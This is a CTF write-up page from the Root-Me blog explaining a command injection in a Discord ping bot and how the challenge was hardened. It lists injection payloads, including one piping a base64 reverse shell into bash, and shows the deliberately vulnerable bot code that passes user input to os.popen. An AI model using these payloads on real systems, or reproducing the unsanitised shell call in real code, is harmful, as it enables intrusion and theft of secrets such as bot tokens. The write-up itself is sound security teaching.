@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Root-Me CTF 10k - The White Rabbit - Root-Me Blog</title><meta name="Description" content="Root Me allows everyone to test and improve their knowledge in computer security and hacking. Legal. Free. Realistic"><meta property="og:title" content="Root-Me CTF 10k - The White Rabbit" />
+<meta property="og:description" content="Writeup of the &lsquo;The White Rabbit&rsquo; challenge during the Root-Me CTF 10k" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.root-me.org/posts/writeup_ctf10k_the_white_rabbit/" />
+<meta property="article:published_time" content="2023-02-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-02-28T00:00:00+00:00" /><meta property="og:site_name" content="Root-Me Blog" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Root-Me CTF 10k - The White Rabbit"/>
+<meta name="twitter:description" content="Writeup of the &lsquo;The White Rabbit&rsquo; challenge during the Root-Me CTF 10k"/>
+<meta name="application-name" content="Root-Me Blog">
+<meta name="apple-mobile-web-app-title" content="Root-Me Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.root-me.org/posts/writeup_ctf10k_the_white_rabbit/" /><link rel="prev" href="https://blog.root-me.org/posts/writeup_ctf10k_cheshire_cat/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Root-Me CTF 10k - The White Rabbit",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.root-me.org\/posts\/writeup_ctf10k_the_white_rabbit\/"
+        },"genre": "posts","keywords": "writeups, CTF10k, Discord, Challenge","wordcount":  995 ,
+        "url": "https:\/\/blog.root-me.org\/posts\/writeup_ctf10k_the_white_rabbit\/","datePublished": "2023-02-28T00:00:00+00:00","dateModified": "2023-02-28T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nishacid"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Root-Me Blog">Root-Me Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Root-Me Blog">Root-Me Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Root-Me CTF 10k - The White Rabbit</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://nishacid.guru" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nishacid</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-02-28">2023-02-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;995 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#how-its-work-">How it&rsquo;s work ?</a></li>
+    <li><a href="#setup-of-the-challenge">Setup of the challenge</a>
+      <ul>
+        <li><a href="#architecture">Architecture</a></li>
+        <li><a href="#running">Running</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="the-white-rabbit">The White Rabbit</h1>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://nishacid.guru/assets/images/writeups/rm_ctf/rm_ctf_logo.png"
+        data-srcset="https://nishacid.guru/assets/images/writeups/rm_ctf/rm_ctf_logo.png, https://nishacid.guru/assets/images/writeups/rm_ctf/rm_ctf_logo.png 1.5x, https://nishacid.guru/assets/images/writeups/rm_ctf/rm_ctf_logo.png 2x"
+        data-sizes="auto"
+        alt="https://nishacid.guru/assets/images/writeups/rm_ctf/rm_ctf_logo.png"
+        title="rm_ctf_logo" /></p>
+<p>During the <a href="https://root-me.org" target="_blank" rel="noopener noreffer ">Root-Me</a> CTF for the 10k members on Discord, I was able to create two Discord challenges, and here is a writeup for explaining how it works and how to exploit it.</p>
+<h2 id="introduction">Introduction</h2>
+<ul>
+<li>Name : <code>The White Rabbit</code></li>
+<li>Category : <code>Misc</code></li>
+<li>Points : <code>500</code> -&gt; <code>463</code></li>
+<li>Solves : <code>30</code></li>
+<li>Level : <code>easy</code></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_desc.png"
+        data-srcset="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_desc.png, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_desc.png 1.5x, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_desc.png 2x"
+        data-sizes="auto"
+        alt="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_desc.png"
+        title="thewhiterabbit-desc" /></p>
+<h2 id="exploitation">Exploitation</h2>
+<p>So we have a Discord bot, which gives us the status of the challenge servers on <a href="https://root-me.org" target="_blank" rel="noopener noreffer ">Root-Me.org</a>, our only available command is <code>!ping</code> ( except <code>!help</code>), and it seems to work fine.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_interactions.png"
+        data-srcset="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_interactions.png, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_interactions.png 1.5x, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_interactions.png 2x"
+        data-sizes="auto"
+        alt="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_interactions.png"
+        title="thewhiterabbit-interactions" /></p>
+<p>Obviously, we can directly think of a command injection, because the <strong>ping</strong> must be executed on the server side. So we will try to give an unnatural behavior to this bot to make an error appear which could give us additional information about its functioning.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_ping.png"
+        data-srcset="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_ping.png, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_ping.png 1.5x, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_ping.png 2x"
+        data-sizes="auto"
+        alt="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_ping.png"
+        title="thewhiterabbit-ping" /></p>
+<p>We soon have confirmation that we are controlling the <code>challenge$VARIABLE.root-me.org</code> variable, and that by inserting unusual characters, we have an error log <code>:x: Error log :</code>, which is empty. An interesting thing to note is that our double quotes <code>&quot;</code> do not appear in the bot&rsquo;s return.
+Now that we understand a little better how our application reacts, let&rsquo;s try to get some response in our error log.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_id.png"
+        data-srcset="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_id.png, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_id.png 1.5x, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_id.png 2x"
+        data-sizes="auto"
+        alt="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_id.png"
+        title="thewhiterabbit-id" /></p>
+<p>And that&rsquo;s it, we have succeeded in returning a <strong>bash</strong> command in our error log, now we just have to read the flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_flag.png"
+        data-srcset="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_flag.png, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_flag.png 1.5x, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_flag.png 2x"
+        data-sizes="auto"
+        alt="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_flag.png"
+        title="thewhiterabbit-flag" /></p>
+<p>In fact, this is not the only <strong>payload</strong> that could successfully inject code, here is an example of a few others:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">!ping <span class="s2">&#34;; cat flag.txt &#34;</span>
+
+<span class="c1"># ${IFS} =&gt; https://en.wikipedia.org/wiki/Input_Field_Separators</span>
+!ping 01.root-<span class="o">||</span>cat<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>flag.txt<span class="o">||</span>true#
+
+<span class="c1"># thanks Feelzor</span>
+!ping <span class="s2">&#34;.attacker.domain .root-me.org || ls . 1&gt;&amp;2; cat flag.txt &#34;</span>
+
+
+<span class="c1"># thanks HyouKa</span>
+!ping <span class="s2">&#34;`sleep 5`&#34;</span>
+!ping <span class="s2">&#34;`echo base64_reverse_shell | base64 -d | bash`&#34;</span>
+</code></pre></div><p>If you have successfully exploited it with a different payload, please let me know :smile:</p>
+<h2 id="how-its-work-">How it&rsquo;s work ?</h2>
+<p>Ok we were able to exploit the vulnerability, but how does it work on the bot side?</p>
+<p>Here is the bot code (without security) that we will use for the example</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python3</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">discord.ext.commands</span> <span class="kn">import</span> <span class="n">Bot</span>
+<span class="kn">from</span> <span class="nn">discord.ext</span> <span class="kn">import</span> <span class="n">commands</span>
+<span class="kn">from</span> <span class="nn">dotenv</span> <span class="kn">import</span> <span class="n">load_dotenv</span>
+<span class="kn">import</span> <span class="nn">discord</span> <span class="c1"># discord.py==2.0.0</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="c1"># Defines some variables</span>
+<span class="n">intents</span> <span class="o">=</span> <span class="n">discord</span><span class="o">.</span><span class="n">Intents</span><span class="o">.</span><span class="n">default</span><span class="p">()</span>
+<span class="n">intents</span><span class="o">.</span><span class="n">message_content</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">bot</span> <span class="o">=</span> <span class="n">commands</span><span class="o">.</span><span class="n">Bot</span><span class="p">(</span><span class="n">command_prefix</span><span class="o">=</span><span class="s1">&#39;!&#39;</span><span class="p">,</span> <span class="n">intents</span><span class="o">=</span><span class="n">intents</span><span class="p">,</span> <span class="n">help_command</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
+<span class="c1"># load .env file</span>
+<span class="n">load_dotenv</span><span class="p">()</span>
+
+<span class="c1"># Bot status and activity</span>
+<span class="nd">@bot.event</span>
+<span class="n">async</span> <span class="k">def</span> <span class="nf">on_ready</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Ready !&#34;</span><span class="p">)</span>
+    <span class="n">activity</span> <span class="o">=</span> <span class="n">discord</span><span class="o">.</span><span class="n">Game</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;No time to say hello, goodbye. I&#39;m late, late, late&#34;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">await</span> <span class="n">bot</span><span class="o">.</span><span class="n">change_presence</span><span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="n">discord</span><span class="o">.</span><span class="n">Status</span><span class="o">.</span><span class="n">online</span><span class="p">,</span> <span class="n">activity</span><span class="o">=</span><span class="n">activity</span><span class="p">)</span>
+
+<span class="c1"># Help command function</span>
+<span class="nd">@bot.command</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;help&#34;</span><span class="p">)</span>
+<span class="n">async</span> <span class="k">def</span> <span class="nf">help_cmd</span><span class="p">(</span><span class="n">ctx</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">ctx</span><span class="p">:</span>
+        <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\n</span><span class="s2">**You can use theses commands :**
+</span><span class="s2">                        ```</span><span class="se">\n</span><span class="s2">!help : print the help list</span><span class="se">\n</span><span class="s2">!ping : ping challengeXX.root-me.org</span><span class="se">\n</span><span class="s2"> exemple: !ping 01```&#34;&#34;&#34;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;Please use !help to have list of commands&#34;</span><span class="p">)</span>
+
+<span class="c1"># Ping command function</span>
+<span class="nd">@bot.command</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;ping&#34;</span><span class="p">)</span>
+<span class="n">async</span> <span class="k">def</span> <span class="nf">ping</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">parameter</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">parameter</span><span class="p">:</span>
+        <span class="n">sh</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;ping -c 3 challenge{parameter}.root-me.org&#34;</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="k">if</span> <span class="s1">&#39;3 received&#39;</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
+            <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;challenge{parameter}.root-me.org is up !</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;challenge{parameter}.root-me.org is down :(&#34;</span><span class="p">)</span>
+            <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;:x: Error log : </span><span class="se">\n</span><span class="s2">{command}&#34;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;Please use a parameter&#34;</span><span class="p">)</span>
+
+<span class="c1"># Run</span>
+<span class="n">bot</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;TOKEN&#34;</span><span class="p">))</span>
+</code></pre></div><p>When we send a basic command like <code>!ping 01</code>, the bot executes this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">ping -c <span class="m">3</span> challenge01.root-me.org
+</code></pre></div><p>However, if we go back to our previous tests and send the commands <code>!ping ;</code> and <code>!ping &quot;hello&quot;</code>, the return is quite different:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ;</span>
+ping -c <span class="m">3</span> challenge<span class="p">;</span>.root-me.org
+ping: challenge: Name or service not known
+/bin/sh: 1: .root-me.org: not found
+
+<span class="c1"># &#34; hello &#34;</span>
+ping -c <span class="m">3</span> challenge hello .root-me.org
+ping: .root-me.org: Name or service not known
+</code></pre></div><p>We can see that the <code>;</code> has been interpreted as a bash separator, and that it has interpreted <code>.root-me.org</code> as a new command.
+This means that the next command we send after the semicolon <code>;</code> will be executed by the server.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># !ping &#34;; id ;&#34;</span>
+
+ping -c <span class="m">3</span> challenge<span class="p">;</span> id <span class="p">;</span>.root-me.org
+ping: challenge: Name or service not known
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>chall<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>chall<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>chall<span class="o">)</span>
+/bin/sh: 1: .root-me.org: not found
+</code></pre></div><p>Now, we have a serious problem with this code. The <strong>token</strong> of the Discord bot is retrieved from the environment using the following code :</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">bot</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;TOKEN&#34;</span><span class="p">))</span>
+</code></pre></div><p>This means that anyone can get this <strong>token</strong> as below, and can modify the bot as they wish.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_token.png"
+        data-srcset="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_token.png, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_token.png 1.5x, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_token.png 2x"
+        data-sizes="auto"
+        alt="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_token.png"
+        title="thewhiterabbit-token" /></p>
+<p>We will see how we can secure this <strong>token</strong> part.</p>
+<h2 id="setup-of-the-challenge">Setup of the challenge</h2>
+<blockquote>
+<p><a href="https://nishacid.guru/assets/sources/the_white_rabbit.zip" target="_blank" rel="noopener noreffer ">Full architecture files here</a></p>
+</blockquote>
+<h3 id="architecture">Architecture</h3>
+<p>The architecture of the challenge is a bit more complex, it is based on 3 containers for a single bot.
+By the way, I greatly thank <a href="https://thinkloveshare.com" target="_blank" rel="noopener noreffer ">TheLaluka</a> who, around some beers and schematics resembling to steganography challenges, helped me a lot to realize this architecture.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">.
+├── broker
+│   ├── broker.py
+│   ├── Dockerfile
+│   └── requirements.txt
+├── chall
+│   ├── chall.py
+│   ├── Dockerfile
+│   ├── flag.txt
+│   └── requirements.txt
+├── docker-compose.yml
+└── .env
+</code></pre></div><ul>
+<li>
+<p><code>docker-compose.yml</code> -&gt; docker-compose file to start the challenge</p>
+</li>
+<li>
+<p><code>.env</code> -&gt; contain the bot token</p>
+</li>
+<li>
+<p><code>broker/broker.py</code> -&gt; python code of the discord bot</p>
+</li>
+<li>
+<p><code>broker/Dockerfile</code> -&gt; Docker image which runs the bot</p>
+</li>
+<li>
+<p><code>broker/requirements.txt</code> -&gt;  python&rsquo;s requirements for the bot</p>
+</li>
+<li>
+<p><code>chall/chall.py</code> -&gt; application flask who will execute the command injection</p>
+</li>
+<li>
+<p><code>chall/Dockerfile</code> -&gt; Docker image image which runs the flask application</p>
+</li>
+<li>
+<p><code>chall/requirements.txt</code> -&gt;  python&rsquo;s requirements for the flask application</p>
+</li>
+<li>
+<p><code>chall/flag.txt</code> -&gt; flag of the challenge</p>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_mermaid.svg"
+        data-srcset="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_mermaid.svg, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_mermaid.svg 1.5x, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_mermaid.svg 2x"
+        data-sizes="auto"
+        alt="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_mermaid.svg"
+        title="whiterabbit-mermaid" /></p>
+<p>This operation allows that the user can not read the content of the Docker environment where the bot is launched, so can not read the token. This also adds a bit of security by preventing the user from interacting with the bot environment.</p>
+<p>Now that security is added, we also need continuous up-time for the CTF duration, which is why in the <code>docker-compose.yml</code> file there is another container named <code>autoheal</code>. It allows restarting containers if they are not working properly.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_autoheal.svg"
+        data-srcset="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_autoheal.svg, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_autoheal.svg 1.5x, https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_autoheal.svg 2x"
+        data-sizes="auto"
+        alt="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_autoheal.svg"
+        title="whiterabbit-autoheal" /></p>
+<p>And thanks to this complete system, still 1 week after the CTF, there was no downtime, nor successful malicious action ( however you have tried ^^)</p>
+<h3 id="running">Running</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">docker-compose -f docker-compose.yml up -d 
+</code></pre></div><p>Thanks for reading, if you have any question about exploitation, configuration, the architecture or other you can DM me on <a href="https://twitter.com/Nishacid" target="_blank" rel="noopener noreffer ">Twitter</a> or Discord <code>Nishacid#1337</code>. Thanks again for helping me to <a href="https://thinkloveshare.com" target="_blank" rel="noopener noreffer ">TheLaluka</a> secure this challenge!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-02-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.root-me.org/posts/writeup_ctf10k_the_white_rabbit/" data-title="Root-Me CTF 10k - The White Rabbit" data-via="rootme_org" data-hashtags="writeups,CTF10k,Discord,Challenge"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.root-me.org/posts/writeup_ctf10k_the_white_rabbit/" data-hashtag="writeups"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.root-me.org/posts/writeup_ctf10k_the_white_rabbit/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeups/">writeups</a>,&nbsp;<a href="/tags/ctf10k/">CTF10k</a>,&nbsp;<a href="/tags/discord/">Discord</a>,&nbsp;<a href="/tags/challenge/">Challenge</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/writeup_ctf10k_cheshire_cat/" class="prev" rel="prev" title="Writeup - Root-Me CTF 10k - Cheshire cat"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Writeup - Root-Me CTF 10k - Cheshire cat</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://root-me.org" target="_blank">Root-Me</a></span>&nbsp;|&nbsp;<span class="license">contact@root-me.org | <a href='/privacy/'>Privacy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
